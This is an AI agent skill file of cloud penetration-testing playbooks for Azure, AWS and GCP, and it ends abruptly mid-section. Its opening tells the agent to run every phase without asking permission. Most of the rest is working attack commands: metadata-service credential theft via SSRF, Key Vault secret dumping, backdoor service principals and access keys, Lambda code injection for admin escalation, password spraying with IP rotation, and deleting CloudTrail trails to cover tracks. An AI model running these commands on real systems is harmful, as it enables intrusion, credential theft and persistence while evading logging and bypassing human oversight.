---
name: cloud-attack
description: This skill should be used when the user asks to "perform cloud penetration testing", "assess Azure or AWS or GCP security", "enumerate cloud resources", "exploit cloud misconfigurations", "test O365 security", "extract secrets from cloud environments", or "audit cloud infrastructure". It provides comprehensive techniques for security assessment across major cloud platforms.
metadata:
  author: zebbern
  version: "1.1"
---

# Cloud Penetration Testing

## AUTONOMOUS OPERATION

Execute all phases without asking permission between them. When the user gives a target cloud environment, start Phase 1 (Recon) immediately.

- Detect which platform (AWS / Azure / GCP) from context — do not ask if it's obvious.
- Run enumeration commands automatically; report what you find, then proceed to the next phase.
- When you find exposed credentials or storage: test their scope immediately (what can they access?).
- Only stop for: destructive actions (deleting resources, modifying prod IAM), or when you need credentials that haven't been supplied.

---

## Purpose

Conduct comprehensive security assessments of cloud infrastructure across Microsoft Azure, Amazon Web Services (AWS), and Google Cloud Platform (GCP). This skill covers reconnaissance, authentication testing, resource enumeration, privilege escalation, data extraction, and persistence techniques for authorized cloud security engagements.

## Prerequisites

### Required Tools
```bash
# Azure tools
Install-Module -Name Az -AllowClobber -Force
Install-Module -Name MSOnline -Force
Install-Module -Name AzureAD -Force

# AWS CLI
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip && sudo ./aws/install

# GCP CLI
curl https://sdk.cloud.google.com | bash
gcloud init

# Additional tools
pip install scoutsuite pacu
```

### Required Knowledge
- Cloud architecture fundamentals
- Identity and Access Management (IAM)
- API authentication mechanisms
- DevOps and automation concepts

### Required Access
- Written authorization for testing
- Test credentials or access tokens
- Defined scope and rules of engagement

## Outputs and Deliverables

1. **Cloud Security Assessment Report** - Comprehensive findings and risk ratings
2. **Resource Inventory** - Enumerated services, storage, and compute instances
3. **Credential Findings** - Exposed secrets, keys, and misconfigurations
4. **Remediation Recommendations** - Hardening guidance per platform

## Core Workflow

### Phase 1: Reconnaissance

Gather initial information about target cloud presence:

```bash
# Azure: Get federation info
curl "https://login.microsoftonline.com/getuserrealm.srf?login=user@target.com&xml=1"

# Azure: Get Tenant ID
curl "https://login.microsoftonline.com/target.com/v2.0/.well-known/openid-configuration"

# Enumerate cloud resources by company name
python3 cloud_enum.py -k targetcompany

# Check IP against cloud providers
cat ips.txt | python3 ip2provider.py
```

### Phase 2: Azure Authentication

Authenticate to Azure environments:

```powershell
# Az PowerShell Module
Import-Module Az
Connect-AzAccount

# With credentials (may bypass MFA)
$credential = Get-Credential
Connect-AzAccount -Credential $credential

# Import stolen context
Import-AzContext -Profile 'C:\Temp\StolenToken.json'

# Export context for persistence
Save-AzContext -Path C:\Temp\AzureAccessToken.json

# MSOnline Module
Import-Module MSOnline
Connect-MsolService
```

### Phase 3: Azure Enumeration

Discover Azure resources and permissions:

```powershell
# List contexts and subscriptions
Get-AzContext -ListAvailable
Get-AzSubscription

# Current user role assignments
Get-AzRoleAssignment

# List resources
Get-AzResource
Get-AzResourceGroup

# Storage accounts
Get-AzStorageAccount

# Web applications
Get-AzWebApp

# SQL Servers and databases
Get-AzSQLServer
Get-AzSqlDatabase -ServerName $Server -ResourceGroupName $RG

# Virtual machines
Get-AzVM
$vm = Get-AzVM -Name "VMName"
$vm.OSProfile

# List all users
Get-MSolUser -All

# List all groups
Get-MSolGroup -All

# Global Admins
Get-MsolRole -RoleName "Company Administrator"
Get-MSolGroupMember -GroupObjectId $GUID

# Service Principals
Get-MsolServicePrincipal
```

### Phase 4: Azure Exploitation

Exploit Azure misconfigurations:

```powershell
# Search user attributes for passwords
$users = Get-MsolUser -All
foreach($user in $users){
    $props = @()
    $user | Get-Member | foreach-object{$props+=$_.Name}
    foreach($prop in $props){
        if($user.$prop -like "*password*"){
            Write-Output ("[*]" + $user.UserPrincipalName + "[" + $prop + "]" + " : " + $user.$prop)
        }
    }
}

# Execute commands on VMs
Invoke-AzVMRunCommand -ResourceGroupName $RG -VMName $VM -CommandId RunPowerShellScript -ScriptPath ./script.ps1

# Extract VM UserData
$vms = Get-AzVM
$vms.UserData

# Dump Key Vault secrets
az keyvault list --query '[].name' --output tsv
az keyvault set-policy --name <vault> --upn <user> --secret-permissions get list
az keyvault secret list --vault-name <vault> --query '[].id' --output tsv
az keyvault secret show --id <URI>
```

### Phase 5: Azure Persistence

Establish persistence in Azure:

```powershell
# Create backdoor service principal
$spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner
$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($spn.Secret)
$UnsecureSecret = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)

# Add service principal to Global Admin
$sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>
$role = Get-MsolRole -RoleName "Company Administrator"
Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId

# Login as service principal
$cred = Get-Credential  # AppID as username, secret as password
Connect-AzAccount -Credential $cred -Tenant "tenant-id" -ServicePrincipal

# Create new admin user via CLI
az ad user create --display-name <name> --password <pass> --user-principal-name <upn>
```

### Phase 6: AWS Authentication

Authenticate to AWS environments:

```bash
# Configure AWS CLI
aws configure
# Enter: Access Key ID, Secret Access Key, Region, Output format

# Use specific profile
aws configure --profile target

# Test credentials
aws sts get-caller-identity
```

### Phase 7: AWS Enumeration

Discover AWS resources:

```bash
# Account information
aws sts get-caller-identity
aws iam list-users
aws iam list-roles

# S3 Buckets
aws s3 ls
aws s3 ls s3://bucket-name/
aws s3 sync s3://bucket-name ./local-dir

# EC2 Instances
aws ec2 describe-instances

# RDS Databases
aws rds describe-db-instances --region us-east-1

# Lambda Functions
aws lambda list-functions --region us-east-1
aws lambda get-function --function-name <name>

# EKS Clusters
aws eks list-clusters --region us-east-1

# Networking
aws ec2 describe-subnets
aws ec2 describe-security-groups --group-ids <sg-id>
aws directconnect describe-connections
```

### Phase 8: AWS Exploitation

Exploit AWS misconfigurations:

```bash
# Check for public RDS snapshots
aws rds describe-db-snapshots --snapshot-type manual --query=DBSnapshots[*].DBSnapshotIdentifier
aws rds describe-db-snapshot-attributes --db-snapshot-identifier <id>
# AttributeValues = "all" means publicly accessible

# Extract Lambda environment variables (may contain secrets)
aws lambda get-function --function-name <name> | jq '.Configuration.Environment'

# Access metadata service (from compromised EC2)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# IMDSv2 access
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"
```

### Phase 9: AWS Persistence

Establish persistence in AWS:

```bash
# List existing access keys
aws iam list-access-keys --user-name <username>

# Create backdoor access key
aws iam create-access-key --user-name <username>

# Get all EC2 public IPs
for region in $(cat regions.txt); do
    aws ec2 describe-instances --query=Reservations[].Instances[].PublicIpAddress --region $region | jq -r '.[]'
done
```

### Phase 10: GCP Enumeration

Discover GCP resources:

```bash
# Authentication
gcloud auth login
gcloud auth activate-service-account --key-file creds.json
gcloud auth list

# Account information
gcloud config list
gcloud organizations list
gcloud projects list

# IAM Policies
gcloud organizations get-iam-policy <org-id>
gcloud projects get-iam-policy <project-id>

# Enabled services
gcloud services list

# Source code repos
gcloud source repos list
gcloud source repos clone <repo>

# Compute instances
gcloud compute instances list
gcloud beta compute ssh --zone "region" "instance" --project "project"

# Storage buckets
gsutil ls
gsutil ls -r gs://bucket-name
gsutil cp gs://bucket/file ./local

# SQL instances
gcloud sql instances list
gcloud sql databases list --instance <id>

# Kubernetes
gcloud container clusters list
gcloud container clusters get-credentials <cluster> --region <region>
kubectl cluster-info
```

### Phase 11: GCP Exploitation

Exploit GCP misconfigurations:

```bash
# Get metadata service data
curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text" -H "Metadata-Flavor: Google"

# Check access scopes
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes -H 'Metadata-Flavor:Google'

# Decrypt data with keyring
gcloud kms decrypt --ciphertext-file=encrypted.enc --plaintext-file=out.txt --key <key> --keyring <keyring> --location global

# Serverless function analysis
gcloud functions list
gcloud functions describe <name>
gcloud functions logs read <name> --limit 100

# Find stored credentials
sudo find /home -name "credentials.db"
sudo cp -r /home/user/.config/gcloud ~/.config
gcloud auth list
```

## Quick Reference

### Azure Key Commands

| Action | Command |
|--------|---------|
| Login | `Connect-AzAccount` |
| List subscriptions | `Get-AzSubscription` |
| List users | `Get-MsolUser -All` |
| List groups | `Get-MsolGroup -All` |
| Current roles | `Get-AzRoleAssignment` |
| List VMs | `Get-AzVM` |
| List storage | `Get-AzStorageAccount` |
| Key Vault secrets | `az keyvault secret list --vault-name <name>` |

### AWS Key Commands

| Action | Command |
|--------|---------|
| Configure | `aws configure` |
| Caller identity | `aws sts get-caller-identity` |
| List users | `aws iam list-users` |
| List S3 buckets | `aws s3 ls` |
| List EC2 | `aws ec2 describe-instances` |
| List Lambda | `aws lambda list-functions` |
| Metadata | `curl http://169.254.169.254/latest/meta-data/` |

### GCP Key Commands

| Action | Command |
|--------|---------|
| Login | `gcloud auth login` |
| List projects | `gcloud projects list` |
| List instances | `gcloud compute instances list` |
| List buckets | `gsutil ls` |
| List clusters | `gcloud container clusters list` |
| IAM policy | `gcloud projects get-iam-policy <project>` |
| Metadata | `curl -H "Metadata-Flavor: Google" http://metadata.google.internal/...` |

### Metadata Service URLs

| Provider | URL |
|----------|-----|
| AWS | `http://169.254.169.254/latest/meta-data/` |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2018-02-01` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` |

### Useful Tools

| Tool | Purpose |
|------|---------|
| ScoutSuite | Multi-cloud security auditing |
| Pacu | AWS exploitation framework |
| AzureHound | Azure AD attack path mapping |
| ROADTools | Azure AD enumeration |
| WeirdAAL | AWS service enumeration |
| MicroBurst | Azure security assessment |
| PowerZure | Azure post-exploitation |

## Constraints and Limitations

### Legal Requirements
- Only test with explicit written authorization
- Respect scope boundaries between cloud accounts
- Do not access production customer data
- Document all testing activities

### Technical Limitations
- MFA may prevent credential-based attacks
- Conditional Access policies may restrict access
- CloudTrail/Activity Logs record all API calls
- Some resources require specific regional access

### Detection Considerations
- Cloud providers log all API activity
- Unusual access patterns trigger alerts
- Use slow, deliberate enumeration
- Consider GuardDuty, Security Center, Cloud Armor

## Examples

### Example 1: Azure Password Spray

**Scenario:** Test Azure AD password policy

```powershell
# Using MSOLSpray with FireProx for IP rotation
# First create FireProx endpoint
python fire.py --access_key <key> --secret_access_key <secret> --region us-east-1 --url https://login.microsoft.com --command create

# Spray passwords
Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList .\users.txt -Password "Spring2024!" -URL https://<api-gateway>.execute-api.us-east-1.amazonaws.com/fireprox
```

### Example 2: AWS S3 Bucket Enumeration

**Scenario:** Find and access misconfigured S3 buckets

```bash
# List all buckets
aws s3 ls | awk '{print $3}' > buckets.txt

# Check each bucket for contents
while read bucket; do
    echo "Checking: $bucket"
    aws s3 ls s3://$bucket 2>/dev/null
done < buckets.txt

# Download interesting bucket
aws s3 sync s3://misconfigured-bucket ./loot/
```

### Example 3: GCP Service Account Compromise

**Scenario:** Pivot using compromised service account

```bash
# Authenticate with service account key
gcloud auth activate-service-account --key-file compromised-sa.json

# List accessible projects
gcloud projects list

# Enumerate compute instances
gcloud compute instances list --project target-project

# Check for SSH keys in metadata
gcloud compute project-info describe --project target-project | grep ssh

# SSH to instance
gcloud beta compute ssh instance-name --zone us-central1-a --project target-project
```

## Troubleshooting

| Issue | Solutions |
|-------|-----------|
| Authentication failures | Verify credentials; check MFA; ensure correct tenant/project; try alternative auth methods |
| Permission denied | List current roles; try different resources; check resource policies; verify region |
| Metadata service blocked | Check IMDSv2 (AWS); verify instance role; check firewall for 169.254.169.254 |
| Rate limiting | Add delays; spread across regions; use multiple credentials; focus on high-value targets |

## References

- [Advanced Cloud Scripts](references/advanced-cloud-scripts.md) - Azure Automation runbooks, Function Apps enumeration, AWS data exfiltration, GCP advanced exploitation



---

## aws-penetration-testing

# AWS Penetration Testing

## Purpose

Provide comprehensive techniques for penetration testing AWS cloud environments. Covers IAM enumeration, privilege escalation, SSRF to metadata endpoint, S3 bucket exploitation, Lambda code extraction, and persistence techniques for red team operations.

## Inputs/Prerequisites

- AWS CLI configured with credentials
- Valid AWS credentials (even low-privilege)
- Understanding of AWS IAM model
- Python 3, boto3 library
- Tools: Pacu, Prowler, ScoutSuite, SkyArk

## Outputs/Deliverables

- IAM privilege escalation paths
- Extracted credentials and secrets
- Compromised EC2/Lambda/S3 resources
- Persistence mechanisms
- Security audit findings

---

## Essential Tools

| Tool | Purpose | Installation |
|------|---------|--------------|
| Pacu | AWS exploitation framework | `git clone https://github.com/RhinoSecurityLabs/pacu` |
| SkyArk | Shadow Admin discovery | `Import-Module .\SkyArk.ps1` |
| Prowler | Security auditing | `pip install prowler` |
| ScoutSuite | Multi-cloud auditing | `pip install scoutsuite` |
| enumerate-iam | Permission enumeration | `git clone https://github.com/andresriancho/enumerate-iam` |
| Principal Mapper | IAM analysis | `pip install principalmapper` |

---

## Core Workflow

### Step 1: Initial Enumeration

Identify the compromised identity and permissions:

```bash
# Check current identity
aws sts get-caller-identity

# Configure profile
aws configure --profile compromised

# List access keys
aws iam list-access-keys

# Enumerate permissions
./enumerate-iam.py --access-key AKIA... --secret-key StF0q...
```

### Step 2: IAM Enumeration

```bash
# List all users
aws iam list-users

# List groups for user
aws iam list-groups-for-user --user-name TARGET_USER

# List attached policies
aws iam list-attached-user-policies --user-name TARGET_USER

# List inline policies
aws iam list-user-policies --user-name TARGET_USER

# Get policy details
aws iam get-policy --policy-arn POLICY_ARN
aws iam get-policy-version --policy-arn POLICY_ARN --version-id v1

# List roles
aws iam list-roles
aws iam list-attached-role-policies --role-name ROLE_NAME
```

### Step 3: Metadata SSRF (EC2)

Exploit SSRF to access metadata endpoint (IMDSv1):

```bash
# Access metadata endpoint
http://169.254.169.254/latest/meta-data/

# Get IAM role name
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Extract temporary credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME

# Response contains:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2019-08-01T05:20:30Z"
}
```

**For IMDSv2 (token required):**

```bash
# Get token first
TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  "http://169.254.169.254/latest/api/token")

# Use token for requests
curl -H "X-aws-ec2-metadata-token:$TOKEN" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

**Fargate Container Credentials:**

```bash
# Read environment for credential path
/proc/self/environ
# Look for: AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/...

# Access credentials
http://169.254.170.2/v2/credentials/CREDENTIAL-PATH
```

---

## Privilege Escalation Techniques

### Shadow Admin Permissions

These permissions are equivalent to administrator:

| Permission | Exploitation |
|------------|--------------|
| `iam:CreateAccessKey` | Create keys for admin user |
| `iam:CreateLoginProfile` | Set password for any user |
| `iam:AttachUserPolicy` | Attach admin policy to self |
| `iam:PutUserPolicy` | Add inline admin policy |
| `iam:AddUserToGroup` | Add self to admin group |
| `iam:PassRole` + `ec2:RunInstances` | Launch EC2 with admin role |
| `lambda:UpdateFunctionCode` | Inject code into Lambda |

### Create Access Key for Another User

```bash
aws iam create-access-key --user-name target_user
```

### Attach Admin Policy

```bash
aws iam attach-user-policy --user-name my_username \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### Add Inline Admin Policy

```bash
aws iam put-user-policy --user-name my_username \
  --policy-name admin_policy \
  --policy-document file://admin-policy.json
```

### Lambda Privilege Escalation

```python
# code.py - Inject into Lambda function
import boto3

def lambda_handler(event, context):
    client = boto3.client('iam')
    response = client.attach_user_policy(
        UserName='my_username',
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
    )
    return response
```

```bash
# Update Lambda code
aws lambda update-function-code --function-name target_function \
  --zip-file fileb://malicious.zip
```

---

## S3 Bucket Exploitation

### Bucket Discovery

```bash
# Using bucket_finder
./bucket_finder.rb wordlist.txt
./bucket_finder.rb --download --region us-east-1 wordlist.txt

# Common bucket URL patterns
https://{bucket-name}.s3.amazonaws.com
https://s3.amazonaws.com/{bucket-name}
```

### Bucket Enumeration

```bash
# List buckets (with creds)
aws s3 ls

# List bucket contents
aws s3 ls s3://bucket-name --recursive

# Download all files
aws s3 sync s3://bucket-name ./local-folder
```

### Public Bucket Search

```
https://buckets.grayhatwarfare.com/
```

---

## Lambda Exploitation

```bash
# List Lambda functions
aws lambda list-functions

# Get function code
aws lambda get-function --function-name FUNCTION_NAME
# Download URL provided in response

# Invoke function
aws lambda invoke --function-name FUNCTION_NAME output.txt
```

---

## SSM Command Execution

Systems Manager allows command execution on EC2 instances:

```bash
# List managed instances
aws ssm describe-instance-information

# Execute command
aws ssm send-command --instance-ids "i-0123456789" \
  --document-name "AWS-RunShellScript" \
  --parameters commands="whoami"

# Get command output
aws ssm list-command-invocations --command-id "CMD-ID" \
  --details --query "CommandInvocations[].CommandPlugins[].Output"
```

---

## EC2 Exploitation

### Mount EBS Volume

```bash
# Create snapshot of target volume
aws ec2 create-snapshot --volume-id vol-xxx --description "Audit"

# Create volume from snapshot
aws ec2 create-volume --snapshot-id snap-xxx --availability-zone us-east-1a

# Attach to attacker instance
aws ec2 attach-volume --volume-id vol-xxx --instance-id i-xxx --device /dev/xvdf

# Mount and access
sudo mkdir /mnt/stolen
sudo mount /dev/xvdf1 /mnt/stolen
```

### Shadow Copy Attack (Windows DC)

```bash
# CloudCopy technique
# 1. Create snapshot of DC volume
# 2. Share snapshot with attacker account
# 3. Mount in attacker instance
# 4. Extract NTDS.dit and SYSTEM
secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local
```

---

## Console Access from API Keys

Convert CLI credentials to console access:

```bash
git clone https://github.com/NetSPI/aws_consoler
aws_consoler -v -a AKIAXXXXXXXX -s SECRETKEY

# Generates signin URL for console access
```

---

## Covering Tracks

### Disable CloudTrail

```bash
# Delete trail
aws cloudtrail delete-trail --name trail_name

# Disable global events
aws cloudtrail update-trail --name trail_name \
  --no-include-global-service-events

# Disable specific region
aws cloudtrail update-trail --name trail_name \
  --no-include-global-service-events --no-is-multi-region-trail
```

**Note:** Kali/Parrot/Pentoo Linux triggers GuardDuty alerts based on user-agent. Use Pacu which modifies the user-agent.

---

## Quick Reference

| Task | Command |
|------|---------|
| Get identity | `aws sts get-caller-identity` |
| List users | `aws iam list-users` |
| List roles | `aws iam list-roles` |
| List buckets | `aws s3 ls` |
| List EC2 | `aws ec2 describe-instances` |
| List Lambda | `aws lambda list-functions` |
| Get metadata | `curl http://169.254.169.254/latest/meta-data/` |

---

## Constraints

**Must:**
- Obtain written authorization before testing
- Document all actions for audit trail
- Test in scope resources only

**Must Not:**
- Modify production data without approval
- Leave persistent backdoors without documentation
- Disable security controls permanently

**Should:**
- Check for IMDSv2 before attempting metadata attacks
- Enumerate thoroughly before exploitation
- Clean up test resources after engagement

---

## Examples

### Example 1: SSRF to Admin

```bash
# 1. Find SSRF vulnerability in web app
https://app.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 2. Get role name from response
# 3. Extract credentials
https://app.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole

# 4. Configure AWS CLI with stolen creds
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# 5. Verify access
aws sts get-caller-identity
```

---

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Access Denied on all commands | Enumerate permissions with enumerate-iam |
| Metadata endpoint blocked | Check for IMDSv2, try container metadata |
| GuardDuty alerts | Use Pacu with custom user-agent |
| Expired credentials | Re-fetch from metadata (temp creds rotate) |
| CloudTrail logging actions | Consider disable or log obfuscation |

---

## Additional Resources

For advanced techniques including Lambda/API Gateway exploitation, Secrets Manager & KMS, Container security (ECS/EKS/ECR), RDS/DynamoDB exploitation, VPC lateral movement, and security checklists, see [references/advanced-aws-pentesting.md](references/advanced-aws-pentesting.md).



---

## cloud-iam-deep

## When to use

Trigger when:
- A cloud credential surfaces (key, secret, token, JSON file)
- SSRF chain reaches IMDS / metadata endpoint
- APK / git-leak reveals embedded cloud key
- Recon shows public S3/GCS/Azure-blob with permissions you can verify
- A Kubernetes API or service-account token is exposed
- Post-RCE on a cloud-hosted instance — pivot to cloud control plane

Do NOT use for:
- On-prem-only environments (use AD attack skills — but those are out of scope per external-only boundary)
- Web2 vulns that happen to be on AWS — use the relevant `hunt-*` skill

---

## Credential identification (first 60 seconds)

```bash
# AWS access key patterns
AKIA[0-9A-Z]{16}                # IAM user access key (long-term)
ASIA[0-9A-Z]{16}                # STS temporary credential
AGPA[0-9A-Z]{16}                # IAM group
AIDA[0-9A-Z]{16}                # IAM user (user-id)
AROA[0-9A-Z]{16}                # IAM role
ANPA[0-9A-Z]{16}                # Managed policy

# AWS secret pattern (40-char base64-ish — context required)
[A-Za-z0-9/+=]{40}              # AWS secret access key

# Azure
AccountKey=[A-Za-z0-9+/=]{86}   # Storage account key
client_secret pattern + UUID    # Azure AD app credential

# GCP service account JSON
{
  "type": "service_account",
  "project_id": "...",
  "private_key_id": "...",
  "private_key": "-----BEGIN PRIVATE KEY-----..."
}

# K8s SA token (JWT format — decode to confirm)
eyJhbGciOiJSUzI1...     # decode kid claim to see issuer
```

---

## AWS — read-only validation (the safe first step)

```bash
# Set credential
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."

# 1. WHO am I?
aws sts get-caller-identity
# Returns: UserId, Account, Arn
# Arn tells you: IAM user vs role, account ID, name

# 2. WHAT can I do? (the privesc question)
# Try common read-only first — failures still inform you
aws iam list-users 2>&1 | head -5
aws iam list-roles 2>&1 | head -5
aws iam list-policies 2>&1 | head -5
aws iam list-groups 2>&1 | head -5

# 3. WHAT policies are attached to me?
aws iam list-attached-user-policies --user-name <self>
aws iam list-user-policies --user-name <self>          # inline policies
aws iam list-groups-for-user --user-name <self>

# 4. Service-by-service surface
aws ec2 describe-instances --max-items 1 2>&1 | head
aws s3 ls 2>&1 | head -10
aws lambda list-functions --max-items 5 2>&1 | head
aws rds describe-db-instances --max-items 5 2>&1 | head
aws secretsmanager list-secrets --max-results 5 2>&1 | head
aws ssm describe-parameters --max-results 5 2>&1 | head

# 5. Audit any cross-account / external trust
aws iam list-roles --query 'Roles[?contains(AssumeRolePolicyDocument.Statement[0].Principal.AWS, `arn:aws:iam::`)]' 2>&1 | head -20
```

---

## AWS privesc patterns (24+ documented — `iam_privesc` techniques)

Quick lookup — if you have any of these IAM actions, escalate via the listed technique:

| You have | Escalate via |
|---|---|
| `iam:CreateAccessKey` | Create access key on any user → impersonate |
| `iam:CreateLoginProfile` | Set a console password on a user → login |
| `iam:UpdateLoginProfile` | Reset console password on a user |
| `iam:AttachUserPolicy` | Attach AdministratorAccess to self |
| `iam:AttachGroupPolicy` | Attach AdministratorAccess to a group you're in |
| `iam:AttachRolePolicy` + sts:AssumeRole | Attach to a role you can assume |
| `iam:PutUserPolicy` | Inline AdministratorAccess to self |
| `iam:PutGroupPolicy` | Inline policy on a group |
| `iam:PutRolePolicy` | Inline on a role you can assume |
| `iam:AddUserToGroup` | Add self to admin group |
| `iam:UpdateAssumeRolePolicy` + sts:AssumeRole | Modify trust to allow self |
| `iam:CreatePolicyVersion` | Create v2 of an attached policy with admin |
| `iam:SetDefaultPolicyVersion` | Switch attached policy to admin version |
| `iam:PassRole` + ec2:RunInstances | Launch EC2 as admin role → use instance creds |
| `iam:PassRole` + lambda:CreateFunction/InvokeFunction | Run code as admin role |
| `iam:PassRole` + cloudformation:CreateStack | CF stack creates resources as admin |
| `iam:PassRole` + glue:CreateDevEndpoint | Notebook runs as admin role |
| `iam:PassRole` + datapipeline | Pipeline runs as admin role |
| `iam:PassRole` + codestar:CreateProject | New project gets admin role |
| `ec2:RunInstances` (with admin instance profile already on the AMI) | Spin instance, exfil creds from IMDS |
| `lambda:UpdateFunctionCode` (function has admin role) | Replace code → exfil creds |
| `lambda:UpdateFunctionConfiguration` | Add layer / env var that exfils |
| `cloudformation:UpdateStack` | Modify stack to grant self admin |
| `sts:AssumeRole` (where trust allows you) | Direct privilege jump |

Many of the destructive ones are out-of-scope for an external red-team; document the path, don't always execute.

---

## AWS — STS / cross-account / role chaining

```bash
# Enumerate roles you can assume across accounts
aws iam list-roles --query 'Roles[].[RoleName,AssumeRolePolicyDocument]' --output json > /tmp/roles.json
# Parse for "Principal.AWS" containing different account IDs

# Assume a role
aws sts assume-role --role-arn "arn:aws:iam::OTHER_ACCT:role/CrossAccountRole" --role-session-name "rt-1"

# Set new creds
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# Verify
aws sts get-caller-identity  # should now show OTHER_ACCT

# Re-enumerate from new identity (chain continues)
```

**Confused-deputy pattern:** look for `sts:ExternalId` missing or trust policies that allow `arn:aws:iam::*:role/*`. If `ExternalId` is not required, anyone can assume the role.

---

## AWS IMDSv1 / IMDSv2 abuse via SSRF

```bash
# IMDSv1 (legacy, still common — straight GET):
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Returns role name → fetch creds:
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
# JSON with AccessKeyId, SecretAccessKey, Token, Expiration

# IMDSv2 (requires PUT to get a token first — usually mitigates SSRF):
curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
TOKEN=...
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/

# SSRF bypass for IMDSv2:
# Most server-side fetchers don't issue PUT requests → IMDSv2 blocks them.
# Exception: SSRF in functions that themselves perform requests with custom headers.
```

---

## Azure — credential validation

```bash
# Login with a credential
az login --service-principal -u <appId> -p <password> --tenant <tenantId>
# OR with managed identity (from inside Azure VM)
az login --identity

# Who am I?
az account show

# Subscriptions
az account list --output table

# Role assignments (Azure RBAC)
az role assignment list --assignee <objectId> --all
az role assignment list --all --query '[?principalId==`<objectId>`]' --output table

# Resources I can read
az resource list --output table | head -30
az storage account list --output table
az keyvault list --output table
az vm list --output table
```

---

## Azure — Managed Identity abuse

```bash
# From inside Azure VM (post-RCE or SSRF to IMDS-equivalent):
# Endpoint: http://169.254.169.254/metadata/identity/oauth2/token
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Returns access_token for the Managed Identity. Use:
TOKEN="..."
curl -H "Authorization: Bearer $TOKEN" "https://management.azure.com/subscriptions?api-version=2020-01-01"

# Get token for Key Vault
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"

# Get token for Graph
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com"
# → If Managed Identity has Graph permissions, read all M365 data
```

---

## Azure privesc patterns

| You have | Escalate via |
|---|---|
| `Microsoft.Authorization/roleAssignments/write` on tenant | Self-assign Owner |
| `Microsoft.Authorization/roleDefinitions/write` | Modify role def to add powers |
| `Microsoft.Compute/virtualMachines/runCommand/action` | Run command on VM (with VM's MI) |
| `Microsoft.KeyVault/vaults/secrets/getSecret/action` | Read all KV secrets |
| `Microsoft.Storage/storageAccounts/listkeys/action` | Read all storage blobs |
| `Microsoft.Web/sites/publishxml/action` | Get publish profile → RCE on app |
| `Microsoft.Web/sites/host/listkeys/action` | Func app key → RCE via function trigger |
| `Microsoft.AAD.Directory.* (App reg) + RoleManagement.ReadWrite.Directory` | Grant self Global Admin |

---

## GCP — service account JSON

```bash
# Activate
gcloud auth activate-service-account --key-file=sa-leaked.json

# Who am I?
gcloud auth list
gcloud config get-value account
gcloud config get-value project

# What roles does this SA have? (project-level only — not org-level)
gcloud projects get-iam-policy <projectId> \
  --flatten="bindings[].members" \
  --format="table(bindings.role)" \
  --filter="bindings.members:<sa-email>"

# Service-by-service:
gcloud compute instances list 2>&1 | head
gcloud storage buckets list 2>&1 | head
gcloud secrets list 2>&1 | head
gcloud functions list 2>&1 | head
gcloud sql instances list 2>&1 | head
gcloud container clusters list 2>&1 | head
```

---

## GCP privesc patterns

| You have | Escalate via |
|---|---|
| `iam.serviceAccounts.getAccessToken` on higher-priv SA | Get token for that SA |
| `iam.serviceAccounts.implicitDelegation` | Chain through delegate SAs |
| `iam.serviceAccounts.signBlob` / `signJwt` on higher SA | Forge JWT for that SA |
| `iam.serviceAccountKeys.create` | Create new key for any SA → impersonate |
| `iam.serviceAccounts.setIamPolicy` | Grant self impersonation rights |
| `iam.roles.update` (on custom role) | Add admin permissions to a role you have |
| `cloudfunctions.functions.update` (function runs as high-priv SA) | Replace code → exfil creds |
| `cloudfunctions.functions.call` + above | Trigger replacement |
| `compute.instances.setMetadata` | Add ssh-keys metadata → SSH as root |
| `compute.instances.setServiceAccount` | Attach higher-priv SA to instance |
| `cloudbuild.builds.create` (build runs as project SA) | Build executes attacker code |
| `deploymentmanager.deployments.create` | Resources created as DM SA |

---

## GCP IMDS attack (via SSRF or post-RCE)

```bash
# GCP IMDS endpoint:
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Returns access token. Use:
